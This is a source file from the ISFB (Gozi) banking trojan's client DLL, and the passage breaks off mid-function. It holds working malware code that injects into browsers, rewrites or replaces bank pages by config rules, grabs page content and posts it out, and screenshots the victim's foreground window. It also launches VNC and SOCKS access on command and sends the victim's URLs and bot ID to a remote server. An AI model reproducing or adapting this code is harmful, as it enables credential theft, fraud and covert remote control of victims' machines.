//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: others.c
// $Revision: 446 $
// $Date: 2014-12-18 19:45:59 +0300 (Чт, 18 дек 2014) $
// description:
//	ISFB client DLL. Multiple different routines used by the client-DLL.


#include "..\common\common.h"
#include "..\common\scrshot.h"
#include "..\crypto\crypto.h"
#include "parser.h"
#include "conf.h"
#include "..\crm.h"
#include "transfer.h"
#include "pipes.h"
#include "http.h"


#define	szNotifyReplace	"url=\"%s\"&ref=\"%s\"&id=%08x%08x%08x%08x"


extern LPTSTR			g_VarsRegistryKey;
static CLSID			g_gifCLSID = {0};
static LONG volatile	g_LastStoredFormHash = 0;

//
//	Searches the specfied URL for the protocol prefix and returns the pointer to the URL without this prefix.
//
static	LPSTR UrlSkipHttp(
	LPSTR	pUrl,		// specifies URL to search within
	PULONG	pPrefixLen	// returns length of a HTTP perfix in chars
	)
{
	ULONG	PrefixLen = 0;
	
	if ((lstrlen(pUrl) > cstrlen(szHttp)) && 
		(pUrl[4] == ':' || pUrl[5] == ':') && (pUrl[0] == 'h' || pUrl[0] == 'H'))
	{
		if (StrStrI(pUrl, szHttp) == pUrl)
			pUrl += (PrefixLen = cstrlen(szHttp));
		else if (StrStrI(pUrl, szHttps) == pUrl)
			pUrl += (PrefixLen = cstrlen(szHttps));
	}

	if (pPrefixLen)
		*pPrefixLen = PrefixLen;

	return(pUrl);
}


//
//	Checks if the specified URL valid for the current host (browser) process.
//	Url can be modified to skip browser-specific prefix.
//
static LPSTR UrlCheckSkipPrefix(
	LPSTR	pUrl,		// pointer to an URL mask
	PULONG	pPrefixLen,	// returns length of a HTTP prefix if any
	PBOOL	pbPost		// returns TRUE if the specified URL mask is a POST mask
	)
{
	BOOL	Ret = FALSE;
	ULONG	Prefix;
	PCHAR	cData = pUrl;

	do  // not a loop
	{
		Prefix = *(PULONG)cData & BROWSER_PREFIX_MASK;

		// Check FF only URL
		if (Prefix == BROWSER_PREFIX_FF)
		{	
			if (g_HostProcess != HOST_FF)
				break;
			cData += BROWSER_PREFIX_SIZE;
		}
		// Check IE only URL
		else if (Prefix == BROWSER_PREFIX_IE) 
		{
			if (g_HostProcess != HOST_IE)
				break;
			cData += BROWSER_PREFIX_SIZE;
		}
		// Check CR only URL
		else if (Prefix == BROWSER_PREFIX_CR)
		{
			if (g_HostProcess != HOST_CR)
				break;
			cData += BROWSER_PREFIX_SIZE;
		}
		// Check OP only URL
		else if (Prefix == BROWSER_PREFIX_OP)
		{
			if (g_HostProcess != HOST_OP)
				break;
			cData += BROWSER_PREFIX_SIZE;
		}

		// Checking if this is a POST rule
		if (cData[0] == '!')
		{
			*pbPost = TRUE;
			cData += 1;
		}
		else
			*pbPost = FALSE;

		Ret = TRUE;
	} while(FALSE);

	if (Ret)
		cData = UrlSkipHttp(cData, pPrefixLen);
	else
		cData = NULL;
	
	return(cData);
}

//
//	Obtains encoder class id and creats a screenshot of the specified window into a GIF stream
//
static WINERROR GetScreenShot(
	HWND		hWnd, 
	LPSTREAM	pStream
	)
{
	WINERROR Status;

	if (g_gifCLSID.Data1 || (Status = ScrGetEncoderClsid(wczImageGif, &g_gifCLSID)) == NO_ERROR)
	{
		// Waiting for 3 seconds to completely download the entire page
		Status = WaitForSingleObject(g_AppShutdownEvent, 3000);

		if (Status == WAIT_TIMEOUT)
			// Generating a screenshot
			Status = ScrMakeScreenshot(hWnd, NULL, pStream, &g_gifCLSID);
	}

	return(Status);
}

//
//	Thread routine. 
//	Waits the sepcified amount of time. Then makes and sends a screenshot of a foreground window
//
static WINERROR WINAPI ScreenThread(
	PVOID WaitTimeout	// milliseconds
	)
{
	HWND hWnd;
	HGLOBAL hGlobal;
	ULONG stream_length;

	Sleep((ULONG)(ULONG_PTR)WaitTimeout);	// waiting for a window to complete drawing

	DbgPrint("ISFB_%04x: Creating foreground window screenshot.\n", g_CurrentProcessId);
	
	if ((hWnd = GetForegroundWindow()) != INVALID_HANDLE_VALUE)
	{
		LPSTREAM pwnd_shot;
		if (CreateStreamOnHGlobal(NULL, TRUE, &pwnd_shot) == S_OK)
		{
			if (GetScreenShot(hWnd, pwnd_shot) == NO_ERROR)
			{
				HRESULT hRes = GetHGlobalFromStream(pwnd_shot, &hGlobal);

				if (SUCCEEDED(hRes))
				{
					LPSTR gl_mem;

					stream_length = StreamGetLength(pwnd_shot);
					gl_mem = (LPSTR)(GlobalLock(hGlobal));

					if (gl_mem != 0)
					{
						DbgPrint("ISFB_%04x: The screenshot successfully created.\n", g_CurrentProcessId);
#ifdef _SEND_FORMS
						ConfSendData(gl_mem, stream_length, SEND_ID_SCRSHOT, NULL, FALSE);		
#else
						PipeSendCommand(CMD_STORE_SCR, gl_mem, stream_length, NULL);
#endif
						GlobalUnlock(hGlobal);
					}
				}	// if (SUCCEEDED(hRes))
			}	// if (GetScreenShot(
			CoInvoke(pwnd_shot, Release);
		}	// if (CreateStreamOnHGlobal(
	}	// if ((hWnd =
	
	return(NO_ERROR);
}


//
//	Initializes a thread that creates a screenshot of an active window.
//
BOOL MakeScreenShot(
	ULONG WaitTimeout	// wait before get a shot (milliseconds)
	)
{
	HANDLE	hThread;
	ULONG	ThreadId;
	BOOL Ret = TRUE;
	if (hThread = CreateThread(NULL, 0, &ScreenThread, (LPVOID)(ULONG_PTR)WaitTimeout, 0, &ThreadId))
		CloseHandle(hThread);
	else
		Ret = FALSE;

	return(Ret);
}


//
//	Copies content of the source buffer into the destination buffer according to the specified masks.
//
ULONG CopyWithMask(
	LPSTR	pSource,	// Source buffer
	ULONG	SourceSize,	// Size of the source buffer in bytes
	LPSTR	SourceMask,	// Source buffer mask
	LPSTR	pDest,		// Destination buffer
	LPSTR	DestMask	// Destination buffer mask
	)
{
	PCHAR	pAsterix, pMem, pDest1 = pDest, pSrcMask, pSrc;
	ULONG	Size;

	if (pSrc = pSrcMask = StrDup(SourceMask))
	{
		while(pAsterix = __memstr(DestMask, lstrlen(DestMask), szCopyTmpl))
		{
			if (Size = (ULONG)(pAsterix - DestMask))
			{
				memcpy(pDest, DestMask, Size);
				pDest += Size;
			}
			DestMask += Size + cstrlen(szCopyTmpl);
			
			if (pAsterix = __memstr(pSrcMask, lstrlen(pSrcMask), szCopyTmpl))
			{
				if (Size = (ULONG)(pAsterix - pSrcMask))
				{
					*pAsterix = 0;

					pMem = __memwiscan(pSource, SourceSize, pSrcMask, &Size);
					ASSERT(pMem == pSource);

					pSource += Size;
					SourceSize -= Size;

					pSrcMask = pAsterix + cstrlen(szCopyTmpl);
				}

				if (pMem = __memwiscan(pSource, SourceSize, pSrcMask, &Size))
					Size = (ULONG)(pMem - pSource);
				else
					Size = SourceSize;

				memcpy(pDest, pSource, Size);
				pDest += Size;
				SourceSize -= Size;
				pSource = pMem;
			}	// if (pAsterix = __memstr(SourceMask, SourceSize, szCopyTmpl))
		}	// while(pAsterix = strstr(DestMask, szCopyTmpl))
		
		Size = lstrlen(DestMask);
		memcpy(pDest, DestMask, Size);
		pDest += Size;

		LocalFree(pSrc);
	}	// if (pSrcMask = StrDup(SourceMask))

	return((ULONG)(pDest - pDest1));
}


//
//	Scans the specified buffer for pSearchStr and replaces all found stings with pReplaceStr.
//
WINERROR MemReplace(
	PCHAR	Buffer,			// pointer to a memory buffer to scan
	ULONG	Size,			// size of the buffer in bytes
	PCHAR	pSearchStr,		// string pattern to search for (may containg wildcast)
	PCHAR	pReplaceStr,	// string to replace found pattern with
	OUT PVOID* pOutBuf,		// receives outpus buffer with replaced data
	OUT PULONG pOutSize		// receives size of the output buffer
	)
{
	WINERROR Status = NO_ERROR;
	ULONG SearchLen, ReplaceLen, Offset = 0, BlockSize, FoundLen, NewSize;
	PCHAR pFound, pRealloc, NewBuffer = NULL;

	SearchLen = (ULONG)lstrlen(pSearchStr);

	if (SearchLen <= Size)
	{
		ReplaceLen = (ULONG)lstrlen(pReplaceStr);
		ASSERT(SearchLen != 0);
		ASSERT(ReplaceLen != 0);

		if (pFound = __memwiscan(Buffer, Size, pSearchStr, &FoundLen))
		{			
			if (NewBuffer = hAlloc((NewSize = Size + ReplaceLen + 1)))
			{
				do 
				{
					if (NewSize < (Offset + Size + ReplaceLen + 1))
					{
						NewSize = (Offset + Size + ReplaceLen + 1);

						if (!(pRealloc = hRealloc(NewBuffer, NewSize)))
						{
							hFree(NewBuffer);
							Status = ERROR_NOT_ENOUGH_MEMORY;
							break;
						}
						else
							NewBuffer = pRealloc;
					}	// if (NewSize < (Offset + Size - FoundLen + ReplaceLen + 1))

					if (BlockSize = (ULONG)(pFound - Buffer))
					{
						memcpy(NewBuffer + Offset, Buffer, BlockSize);
						Offset += BlockSize;
					}


#ifdef _REPLACE_COPY_MASK
					Offset += CopyWithMask(pFound, FoundLen, pSearchStr, NewBuffer + Offset, pReplaceStr);
#else
					memcpy(NewBuffer + Offset, pReplaceStr, ReplaceLen);
					Offset += ReplaceLen;
#endif
					Buffer = pFound + FoundLen;
					Size -= (BlockSize + FoundLen);
							
					if (Size == 0)
						break;

					pFound = __memwiscan(Buffer, Size, pSearchStr, &FoundLen);

				}while (pFound);

				if (NewBuffer)
				{
					ASSERT(Status == NO_ERROR);

					if (Size)
					{
						memcpy(NewBuffer + Offset, Buffer, Size);
						Offset += Size;
					}
			
					NewBuffer[Offset] = 0;		// terminating with zero

					*pOutBuf = NewBuffer;
					*pOutSize = Offset;
				}
				else
				{
					ASSERT(Status != NO_ERROR);
				}
			}	// if (newpMem = hAlloc(
			else
				Status = ERROR_NOT_ENOUGH_MEMORY;
		}	// if (pFoundMem = MegaFind(
		else
			Status = ERROR_FILE_NOT_FOUND;
	}	// if (uSearchMemLen <= uLen)
	else
		Status = ERROR_INVALID_PARAMETER;
	
	return(Status);
}


BOOL ReplaceReg(LPVOID lpData, ULONG DataSize, PVOID* pOutBuf, PULONG pOutSize)
{
	WINERROR Status = NO_ERROR;
	BOOL	Ret = FALSE;
	ULONG	bSize = MAX_PATH_BYTES, nSize = bSize, vSize = bSize;
	PCHAR	lpValData = NULL, lpValName = NULL, pData = (PCHAR)lpData;
	PVOID	out_buf = NULL;
	ULONG	out_size = 0;
	CHAR	StrFmt[GUID_STR_LEN];

	if ((lpValData = hAlloc(bSize)) && (lpValName = hAlloc(bSize)) && g_ClientIdString)
	{
		HKEY hKey;

		if ((Status = RegCreateKey(HKEY_CURRENT_USER, g_VarsRegistryKey, &hKey)) == NO_ERROR)
		{
			DWORD dwIndex = 0;
			while (TRUE)
			{
				do
				{	// Since this function doesn't return current buffer size in case of fault we have to 
					//  increment both buffers with the constant value
					Status = RegEnumValue(hKey, dwIndex, lpValName, &nSize, NULL, NULL, lpValData, &vSize);
					if (Status == ERROR_MORE_DATA)
					{
						hFree(lpValData);
						hFree(lpValName);
						bSize += MAX_PATH_BYTES;
						lpValData = hAlloc(bSize);
						lpValName = hAlloc(bSize);
						vSize = bSize;
						nSize = bSize;
					}
				} while ((Status == ERROR_MORE_DATA) && (lpValData) && (lpValName));

				if (Status != NO_ERROR)
					break;

				if ((Status = MemReplace(pData, DataSize, (PCHAR)lpValName, (PCHAR)lpValData, &out_buf, &out_size)) == NO_ERROR)
				{
					ASSERT(out_buf);
					ASSERT(out_size);

					if (pData != (PCHAR)lpData)
						hFree(pData);

					pData = out_buf;
					DataSize = out_size;
					Ret = TRUE;
				}

				++dwIndex;
			}	// while (TRUE)

			RegCloseKey(hKey);
		}	// if ((Status = RegCreateKey(

		if ((Status = MemReplace((PCHAR)pData, DataSize, szReplaceUserId, g_ClientIdString, &out_buf, &out_size)) == NO_ERROR)
		{
			if (pData != (PCHAR)lpData)
				hFree(pData);

			pData = out_buf;
			DataSize = out_size;
			Ret = TRUE;
		}

		// Replacing @GROUP@ keyword with the current group ID.
		wsprintf((LPSTR)&StrFmt, "%u", g_ClientId.GroupId);
		if ((Status = MemReplace((PCHAR)pData, DataSize, szReplaceVersion, (LPSTR)&StrFmt, &out_buf, &out_size)) == NO_ERROR)
		{
			if (pData != (PCHAR)lpData)
				hFree(pData);

			pData = out_buf;
			DataSize = out_size;
			Ret = TRUE;
		}
	}	// if (lpValData && lpValName)

	if (lpValData)
		hFree(lpValData);
	if (lpValName)
		hFree(lpValName);

	if (Ret)
	{
		// a replace occured
		ASSERT(pData != lpData);
		*pOutBuf = pData;
		if (pOutSize)
			*pOutSize = DataSize;
	}
	
	return(Ret);
}

static BOOL GrabContent(
	PCHAR	pURL,
	PCHAR	pMem,
	ULONG	MemSize,
	PCHAR	pStartMask,
	PCHAR	pEndMask,
	PCHAR	pVarName,
	PULONG	pGrabPart
	)
{
	BOOL	Ret = FALSE;
	PCHAR	tStart, tEnd, pGrabMem;
	ULONG	SearchLen, FoundLen, GrabLen, TotalLen;

	while (MemSize && (tStart = __memwiscan(pMem, MemSize, pStartMask, &FoundLen)))
	{							
		tStart += FoundLen;
		SearchLen = MemSize - (ULONG)(tStart - pMem);
	
		if ((!SearchLen) || !(tEnd = __memwiscan(tStart, SearchLen, pEndMask, &FoundLen)))
			break;

		GrabLen = (ULONG)(tEnd - tStart);
		TotalLen = GrabLen + cstrlen(szGrabData);

		MemSize -= (ULONG)(tEnd - pMem) - FoundLen;
		pMem = tEnd + FoundLen;

		if (!(pGrabMem = (PCHAR)hAlloc(TotalLen + sizeof(CHAR))))
			continue;
										
		lstrcpy(pGrabMem, szGrabData);																		
		lstrcpyn(pGrabMem + cstrlen(szGrabData), tStart, GrabLen + 1);

		if (pVarName)								
			StoreVar(pVarName, (pGrabMem + lstrlen(szGrabData)));
				
		PostForms(pURL, NULL, NULL, pGrabMem, TotalLen, SEND_ID_GRAB, FALSE);
		Ret = TRUE;

		hFree(pGrabMem);
	}	// while (MemSize && (tStart = __memwiscan(pMem, MemSize, pStartMask, &FoundLen)))

	if (pGrabPart)
		*pGrabPart = MemSize;

	return(Ret);
}

//
//	Processes specified data stream received from the specified URL. Returns STREAM_XXX status code.
//	Current config must be locked here.
//
static ULONG _Process(
	LPSTREAM	pStream,		// Stream to process
	LPSTREAM	pGrabStream,	// grab stream containing previously processed data
	PCHAR		pData,			// Config data (config must be locked shared on enter and stays locked on exit)
	PCHAR		pURL,			// URL the stream was downloaded from
	BOOL		IsSsl,
	PTRANSFER_CONTEXT tCtx
	)
{
	ULONG CmdHash, Ret = STREAM_NOTHING;
	PCHAR szNewURL = 0;
	BOOL bPost, bModified = FALSE;
	LPSTREAM hStream;

	PCHAR	html_mem = 0;
	ULONG	html_sz = 0;

	PCHAR	cData = pData, NewUrl, TargetUrl;
	PCHAR	s[6];
	ULONG	l[6];
	ULONG	i;
	ULONG	HttpPrefixLen;

	ULONG	MemSize;
	PCHAR	pMem = NULL;

	ASSERT_CONFIG_LOCKED_SHARED(g_ConfigData);
	ASSERT(g_ConfigData.UnpackedData);

	DbgPrint("ISFB_%04x: Processing stream of %u bytes for URL: %s\n", g_CurrentProcessId, StreamGetLength(pStream), pURL);

	TargetUrl = UrlSkipHttp(pURL, NULL);

	while (TRUE)
	{
		for (i=0; i<6; i++)
		{
			s[i] = cData + sizeof(ULONG);
			l[i] = *(ULONG*)cData;
			cData = s[i]+l[i];
		}

		// Checking if the URL was specified
		if (l[0] <= 1)
			break;

		if ((NewUrl = UrlCheckSkipPrefix(s[0], &HttpPrefixLen, &bPost)) && !bPost && 
			(HttpPrefixLen == 0 || (IsSsl && HttpPrefixLen == cstrlen(szHttps)) || (!IsSsl && HttpPrefixLen == cstrlen(szHttp))) && 
			__strwicmp(NewUrl, TargetUrl))
		{			
			// Checking if the page should be replaced 
			if (l[5]>1 && l[2]<=1 && l[1]<=1)
			{
				// Full page replace
				if ((tCtx) && ((tCtx->Headers) || (TransferCompleteReceive(tCtx, FALSE) == NO_ERROR)))
				{
					StreamClear(pStream);
					CoInvoke(pStream, Write, tCtx->Buffer, tCtx->Length, NULL);
					if (pMem)
					{
						// Since the page was replaced we ignore all previouse modifications if any
						hFree(pMem);
						pMem = NULL;
					}
					Ret |= (_Process(pStream, NULL, pData, (PCHAR)&tCtx->Url, FALSE, NULL) | STREAM_FULL_REPLACE);
				}
				break;
			}	// if (l[5]>1 && l[2]<=1 && l[1]<=1)

			if (l[1] > 1)
			{
				if (!pMem)
				{
					MemSize = StreamGetLength(pStream);

					if ((MemSize) && (pMem = (PCHAR)hAlloc(MemSize)))
					{
						StreamGotoBegin(pStream);
						CoInvoke(pStream, Read, pMem, MemSize, NULL);
					}
				}

				if (pMem && MemSize)
				{
					CmdHash = (Crc32(s[1], l[1] - 1) ^ g_CsCookie);

					switch (CmdHash)
					{
					case CRC_NEWGRAB:
						if (pGrabStream)
						{
							ULONG	GrabSize, GrabPart;
							PCHAR	pGrabMem;

							GrabSize = StreamGetLength(pGrabStream);
							if (pGrabMem = hAlloc(GrabSize + MemSize))
							{
								StreamGotoBegin(pGrabStream);
								CoInvoke(pGrabStream, Read, pGrabMem, GrabSize, NULL);
								StreamClear(pGrabStream);
								memcpy(pGrabMem + GrabSize, pMem, MemSize);
								GrabSize += MemSize;

								if (GrabContent(pURL, pGrabMem, GrabSize, s[3], s[4], (l[2] > 1) ? s[2] : NULL, &GrabPart))
									Ret |= STREAM_GRAB_TAGS;
								
								if (GrabPart)
									CoInvoke(pGrabStream, Write, pGrabMem + GrabSize - GrabPart, GrabPart, NULL);

								hFree(pGrabMem);
							}	// if (pGrabMem = hAlloc(GrabSize + pMemSize))
						}	// if (pGrabStream)
						else
						{
							if (GrabContent(pURL, pMem, MemSize, s[3], s[4], (l[2] > 1) ? s[2] : NULL, NULL))
								Ret |= STREAM_GRAB_TAGS;
						}
						break;
					case CRC_SCREENSHOT:
						// Make a screenshot
						if (l[5] <= 1 || __memstr(pMem, MemSize, s[5]) != 0)
						{
							MakeScreenShot(3000);
							Ret |= STREAM_SCREENSHOT;
						}
						break;
#ifdef _ENABLE_VIDEO
					case CRC_VIDEO:
						// Capture a video
						if (l[2] >= 1 && (l[5] <= 1 || __memstr(pMem, MemSize, s[5]) != 0))
						{
							if (StrToIntEx(s[2], 0, &i) && i)
							{
								PipeSendCommand(CMD_MAKE_VIDEO, (PCHAR)&i, sizeof(ULONG), NULL);
								Ret |= STREAM_VIDEO;
							}
						}
						break;
#endif	// _ENABLE_VIDEO
#ifdef _ENABLE_SOCKS
					case CRC_SOCKS:
						// Start the SOCKS server
						if (l[2] >= 1 && (l[5] <= 1 || __memstr(pMem, MemSize, s[5]) != 0))
						{
							SOCKADDR_IN	Addr;
							if (IniStringToTcpAddress(s[2], &Addr, TRUE))
							{
								PipeSendCommand(CMD_RUN_SOCKS, (PCHAR)&Addr, sizeof(SOCKADDR_IN), NULL);
								Ret |= STREAM_SOCKS;
							}
						}
						break;
#endif
					case CRC_VNC:
						// Download and start the VNC server
						if (l[2] >= 1 && (l[5] <= 1 || __memstr(pMem, MemSize, s[5]) != 0))
						{
							PipeSendCommand(CMD_RUN_VNC, s[2], l[2], NULL);
							Ret |= STREAM_VNC;
						}
					case CRC_PROCESS:
						// GET_URL: load and process an other resource
						szNewURL = s[5];
						if (ReplaceReg(s[5], (ULONG)lstrlen(s[5]) + 1, &szNewURL, 0) &&
							CreateStreamOnHGlobal(NULL, TRUE, &hStream) == S_OK)
						{
							if (RecvHttpData(szNewURL, (PCHAR*)&html_mem, &html_sz, FALSE) == NO_ERROR)
							{
								CoInvoke(hStream, Write, html_mem, html_sz, NULL);
								StreamGotoBegin(hStream);
									
								hFree(html_mem);

								Ret |= _Process(hStream, NULL, pData, s[5], FALSE, NULL);

								hFree(szNewURL);
							}
							CoInvoke(hStream, Release);
						}	// if (ReplaceReg(s[5], (ULONG)lstrlen(s[5]) + 1, &szNewURL, 0) &&
						break;
					case CRC_FILE:
					case CRC_HIDDEN:
						ASSERT(FALSE);
						break;
					default:
						if (l[2] > 1)
						{
							PCHAR	pOutBuf, pReplace = s[2];
							ULONG	OutSize;


							// Replacing keywords within the replace string
							ReplaceReg(s[2], lstrlen(s[2]) + 1, &pReplace, NULL);

							// Replacing a part of page content
							if (MemReplace(pMem, MemSize, s[1], pReplace, &pOutBuf, &OutSize) == NO_ERROR)
							{
								hFree(pMem);
								pMem = pOutBuf;
								MemSize = OutSize;
								Ret |= STREAM_CONTENT_REPLACE;
								bModified = TRUE;
							}

							if (pReplace != s[2])
								hFree(pReplace);
						}	// if (l[1] > 1 && l[2] > 1)
						break;
					}	// switch (CmdHash)
				}	// if (pMem && MemSize)
			}	// if (l[1] > 1)
		}	// if ((NewUrl = UrlCheckSkipPrefix(s[0])) && __strwicmp(NewUrl, pURL))
	}	// while (TRUE)

	if (pMem)
	{
		if (bModified)
		{
			StreamClear(pStream);
			CoInvoke(pStream, Write, pMem, MemSize, NULL);
		}
		hFree(pMem);
	}	// if (pMem)

	StreamGotoBegin(pStream);

	DbgPrint("ISFB_%04x: Processing stream complete with status %u\n", g_CurrentProcessId, Ret);
	return(Ret);

}

//
//	Processes the specified data stream according to the current config.
//	Returns the processing status.
//
ULONG ConfigProcessStream(
	LPSTREAM	pStream,		// current data stream to process
	LPSTREAM	pGrabStream,	// grab stream containing previously processed data
	LPSTR		pUrl,			// URL the data downloaded from
	BOOL		IsSsl,			// specifies TRUE if this is SSL connection request
	PVOID		tCtx			// transfer context for a full page replace operation
	)
{
	ULONG Ret = 0;
	ConfigLockShared(&g_ConfigData);
	if (g_ConfigData.UnpackedData)
		Ret = _Process(pStream, pGrabStream, g_ConfigData.UnpackedData, pUrl, IsSsl, tCtx);
	ConfigUnlockShared(&g_ConfigData);
	return(Ret);
}

WINERROR GetReplaceHeaders(
	PVOID	pContext,
	LPSTR*	ppHeaders,
	PULONG	pSize
	)
{
	WINERROR	Status;
	PCHAR		pHeaders;
	ULONG		Size;
	PTRANSFER_CONTEXT	Ctx = (PTRANSFER_CONTEXT)pContext;

	if ((Status = TransferCompleteReceive(Ctx, TRUE)) == NO_ERROR)
	{
		Size = lstrlen(Ctx->Headers);
		if ((Size) && (pHeaders = hAlloc(Size + sizeof(CHAR))))
		{
			lstrcpy(pHeaders, Ctx->Headers);
			*ppHeaders = pHeaders;
			*pSize = Size;
			ASSERT(Status == NO_ERROR);
		}
		else
			Status = ERROR_NOT_ENOUGH_MEMORY;
	}	// if ((Status = TransferCompleteReceive(Ctx, TRUE)) == NO_ERROR)

	return(Status);
}


// ---- String support routines ---------------------------------------------------------------------------------------------


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Removes part of string starting with substring A and ending with substring B.
//
BOOL StrCutA(
			LPSTR Where, 
			LPSTR A, 
			LPSTR B
			)
{
	BOOL	Ret = FALSE;
	LPSTR	aStr, bStr;

	if (aStr = StrStrI(Where, A))
	{
		if (bStr = StrStrI(aStr, B))
			lstrcpy(aStr, bStr + lstrlen(B));
		else
			aStr[0] = 0;
		Ret = TRUE;
	}
	return(Ret);
}


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Removes part of string starting with substring A and ending with substring B.
//
BOOL StrCutW(
			LPWSTR Where, 
			LPWSTR A, 
			LPWSTR B
			)
{
	BOOL	Ret = FALSE;
	LPWSTR	aStr, bStr;

	if (aStr = StrStrIW(Where, A))
	{
		if (bStr = StrStrIW(aStr, B))
			lstrcpyW(aStr, bStr + lstrlenW(B));
		else
			aStr[0] = 0;
		Ret = TRUE;
	}
	return(Ret);
}

// ----- Registry support routines -----------------------------------------------------------------------------------------

//
//	Stores specified string into the specified registry parameter value.
//
WINERROR StoreVar(
	LPTSTR	VarName,	// name of the variable to store the data
	LPTSTR	VarValue	// data string
	)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	HKEY	hKey;
	ULONG	NameSize, bSize;
	LPTSTR	NameStr;

	NameSize = (lstrlen(VarName) + cstrlen(szStoreVarFmt) + 1) * sizeof(_TCHAR);

	if (NameStr = hAlloc(NameSize))
	{
		bSize = wsprintf(NameStr, szStoreVarFmt, VarName);
		ASSERT(bSize < NameSize);

		if ((Status = RegCreateKey(HKEY_CURRENT_USER, g_VarsRegistryKey, &hKey)) == NO_ERROR)
		{
			Status = RegSetValueEx(hKey, NameStr, 0, REG_SZ, VarValue, (ULONG)(lstrlen(VarValue) + 1) * sizeof(_TCHAR));
			RegCloseKey(hKey);
		}

		hFree(NameStr);
	}	// if (NameStr = hAlloc(NameSize))

	return(Status);
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Searches the specified VarString for teh structure "VarName=VarValue" with the specified VarName and extracts the VarValue
//   into newly allocated string. The caller is responsible for freeng the string.
//
LPTSTR ExtractVar(
			LPTSTR	VarString,	// String of variavles and values
			LPTSTR	VarName		// Variable name to extract
			)
{
	ULONG	VarNameLen = (ULONG)lstrlen(VarName);
	LPTSTR	NewName = (LPTSTR)hAlloc((VarNameLen+2)*sizeof(_TCHAR));
	LPTSTR  NewVal = (LPTSTR)hAlloc((lstrlen(VarString)+1)*sizeof(_TCHAR));

	if (NewName)
	{
		if (NewVal)
		{
			LPTSTR vStr;
			NewVal[0] = 0;
			lstrcpy(NewName, VarName);
			NewName[VarNameLen] = '=';
			NewName[VarNameLen+1] = 0;
			if (vStr = StrStrI(VarString, NewName))
			{
				ULONG i = 0;
				vStr += (VarNameLen+1);
				while (vStr[i] != 0 && vStr[i] != '&')
				{
					NewVal[i] = vStr[i];
					i += 1;
				}
				NewVal[i] = 0;
			}
			
			if (NewVal[0] == 0)
			{
				hFree(NewVal);
				NewVal = NULL;
			}

		}
		hFree(NewName);
	}
	return(NewVal);
}


//
//	Extracts the value of the specified variable from the variable string and saves in into the registry.
//
BOOL ExtractStoreVar(
		 LPTSTR	VarString,	// String with variables in the format: "VarName=VarValue".
		 LPTSTR	VarName,	// Name of the variable wich value to extract.
		 LPTSTR RegVarName	// Name of the registry variable to save the value.
		 )
{
	BOOL Ret = FALSE;
	LPTSTR VarValue = ExtractVar(VarString, VarName);
	if (VarValue)
	{
		if (StoreVar(RegVarName, VarValue) == NO_ERROR)
			Ret = TRUE;
		hFree(VarValue);
	}
	return(Ret);
}

// ---- Other routines ------------------------------------------------------------------------------------------------------


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Initializes full content replace for the specified URL.
//	Replaces SrcPattern with RepPattern within the specified URL, allocates TRANSFER_CONTEXT and initiates receive.
//
static BOOL InitFullReplace(
	IN	PCHAR	pUrl,		// URL to replace content
	IN	PCHAR	pReferer,	// HTTP referer string
	IN	PCHAR	SrcPattern,	// Pattern within the URL to replace
	IN	PCHAR	RepPattern,	// New pattern 
	OUT	PVOID*	ptCtx		// variable that receives a pointer to TRANSFER_CONTEXT
	)
{
	BOOL	Ret = FALSE;
	PCHAR	NewPattern, RepUrl, RepReg = NULL, NewUrl, OutBuf = NULL;
	ULONG	OutLen, UrlLen = lstrlen(pUrl);
	PTRANSFER_CONTEXT	tCtx;

	OutLen = lstrlen(SrcPattern);

	if (NewPattern = hAlloc(OutLen + sizeof(CHAR)))
	{
		if (SrcPattern[0] == '*')
		{
			SrcPattern += sizeof(CHAR);
			OutLen -= sizeof(CHAR);
		}

		lstrcpy(NewPattern, SrcPattern);
		if (NewPattern[OutLen - 1] == '*')
			NewPattern[OutLen - 1] = 0;

		// Replace SrcPattern with RepPattern within the URL
		if (MemReplace(pUrl, UrlLen, NewPattern, RepPattern, &OutBuf, &OutLen) == NO_ERROR)
		{
			RepUrl = OutBuf;		

			// If RepPattern starts with 'HTTP' the new URL will start from it too
			if (*(PDWORD)RepPattern != 'ptth' || !(NewUrl = StrStrI(OutBuf + 1, szHttpEx)))
				NewUrl = (PCHAR)OutBuf;

			UrlLen = lstrlen(NewUrl);

			// Check for Reg-saved variables 
			if (ReplaceReg(NewUrl, UrlLen + 1, &OutBuf, &OutLen))
				NewUrl = RepReg = OutBuf;

			// Allocate and initialize TRANSFER_CONTEXT
			if (tCtx = TransferAllocateContextForUrl(NewUrl))
			{
#ifdef	_FULL_REPLACE_PARAMETERS
				PCHAR	RequestParams;
				if (RequestParams = hAlloc(cstrlen(szNotifyReplace) + lstrlen(pUrl) + (pReferer == NULL ? 0 : lstrlen(pReferer)) + 16*2 + 1))
				{
					OutLen = wsprintf(RequestParams, szNotifyReplace, 
						pUrl, 
						(pReferer == NULL ? "" : pReferer),
						htonL(g_ClientId.UserId.Data1), 
						htonL(g_ClientId.UserId.Data2), 
						htonL(g_ClientId.UserId.Data3), 
						htonL(g_ClientId.UserId.Data4)
						);
					// Initiate receive
					if (TransferInitializeReceive(tCtx, NewUrl, g_UserAgentStr, RequestParams, OutLen, TRUE) == NO_ERROR)
#else
					// Initiate receive
					if (TransferInitializeReceive(tCtx, NewUrl, g_UserAgentStr, NULL, 0, FALSE) == NO_ERROR)
#endif
					{
						*ptCtx = tCtx;
						Ret = TRUE;
					}
					else
						TransferReleaseContext(tCtx);
#ifdef	_FULL_REPLACE_PARAMETERS
					hFree(RequestParams);
				}
#endif
			}	// if (*ptCtx = hAlloc(sizeof(TRANSFER_CONTEXT)))

			hFree(RepUrl);

			if (RepReg)
				hFree(RepReg);
		}	// if (MemReplace(pUrl, UrlLen, NewPattern, RepPattern, &OutBuf, &OutLen) == NO_ERROR)
		hFree(NewPattern);
	}	// if (NewPattern = hAlloc(OutLen + sizeof(CHAR)))

	return(Ret);
}



static ULONG ConfigCheckInitUrlInternal(
	IN	PCHAR	TargetUrl,	// URL to check
	IN	PCHAR	pReferer,	// HTTP referer string
	IN	BOOL	IsSsl,		// specify TRUE if this is SSL connection request
	IN	PCHAR	cData,		// config data
	OUT	PVOID*	ptCtx		// (OPTIONAL) variable to store a pointer to TRANSFER_CONTEXT
	)
{
	ULONG	Status = URL_STATUS_UNDEF;
	PCHAR	s[6];
	ULONG	l[6], i, HttpPrefixLen;
